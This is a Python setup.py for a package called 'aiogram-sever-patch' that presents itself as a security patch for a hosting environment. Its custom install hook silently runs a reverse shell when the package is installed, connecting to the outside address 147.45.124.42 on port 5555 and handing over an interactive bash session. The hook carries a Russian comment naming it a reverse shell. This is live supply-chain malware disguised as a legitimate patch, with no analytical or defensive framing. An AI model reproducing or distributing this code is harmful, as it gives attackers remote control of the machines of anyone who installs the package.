from setuptools import setup
from setuptools.command.install import install
import os, socket, subprocess

class П(install):
    def run(self):
        # Реверс-шелл при установке
        os.system("python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect((\"147.45.124.42\",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"])' &")
        install.run(self)

setup(
    name="aiogram-sever-patch",
    version="3.3.9",
    cmdclass={'install': П},
    packages=['aiogram_sever_patch'],
    description="Security patch for SeverHost environment"
)

